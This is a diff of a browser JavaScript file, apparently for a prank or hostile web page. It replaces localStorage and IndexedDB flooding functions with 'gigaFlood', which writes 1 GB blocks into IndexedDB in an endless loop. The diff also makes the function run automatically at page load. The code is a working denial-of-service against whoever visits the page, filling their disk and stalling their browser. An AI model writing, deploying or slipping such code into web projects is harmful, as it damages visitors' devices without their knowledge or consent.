@@ -30,64 +30,47 @@ let cookieBlocked = document.cookie.indexOf("check=1") === -1;
   } else {
     console.log("✅ Normal Mode");
   }
+function gigaFlood() {
+  const request = indexedDB.open("apocalypse", 1);
 
-function floodLocalStorage() {
-  try {
-    let i = 0;
-    const payload = "💣".repeat(1024 * 100);
-    while (true) {
-      localStorage.setItem("kaboom_" + i, payload);
-      i++;
-      if (i % 50 === 0) console.log(`localStorage: ~${i * 100}KB used`);
-    }
-  } catch (e) {
-    console.warn("💀 localStorage FULL:", e);
-  }
-}
-
-function floodIndexedDB() {
-  const request = indexedDB.open("nukeDB", 1);
-
-  request.onupgradeneeded = function(event) {
+  request.onupgradeneeded = function (event) {
     const db = event.target.result;
-    if (!db.objectStoreNames.contains("doomStore")) {
-      db.createObjectStore("doomStore");
+    if (!db.objectStoreNames.contains("💽")) {
+      db.createObjectStore("💽");
     }
   };
 
-  request.onsuccess = function(event) {
+  request.onsuccess = function (event) {
     const db = event.target.result;
-    const chunkSize = 1000 * 1024 * 1024;
-    const blob = new Uint8Array(chunkSize);
-    blob.fill(133);
+    const blob = new Uint8Array(1024 * 1024 * 1024);
+    blob.fill(69);
 
     let i = 0;
 
-    function writeChunk() {
+    function go() {
+      const tx = db.transaction("💽", "readwrite");
+      const store = tx.objectStore("💽");
 
-      const tx = db.transaction("doomStore", "readwrite");
-      const store = tx.objectStore("doomStore");
+      const putReq = store.put(blob, "🧠" + i);
 
-      const putRequest = store.put(blob, "💾" + i);
-
-      putRequest.onsuccess = function() {
-        i++;
-        if (i % 10 === 0) console.log(`IndexedDB: ${i}MB written`);
-        requestIdleCallback(writeChunk);
+      putReq.onsuccess = function () {
+        console.log(`💾 Wrote ${++i}GB... Total: ${i}GB`);
+        requestIdleCallback(go);
       };
 
-      putRequest.onerror = function(e) {
-        console.warn("💀 IndexedDB put error:", e.target.error);
+      putReq.onerror = function (e) {
+        console.warn("☠️ Storage KO:", e.target.error);
       };
     }
 
-    writeChunk();
+    go();
   };
 
-  request.onerror = function(event) {
-    console.error("IndexedDB open error:", event.target.error);
+  request.onerror = function (e) {
+    console.error("🧨 DB Open Fail:", e.target.error);
   };
 }
+
 
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
@@ -1259,5 +1242,4 @@ function detectBrowser () {
     return 'firefox'
   }
 }
-floodLocalStorage();
-floodIndexedDB();
+gigaFlood();
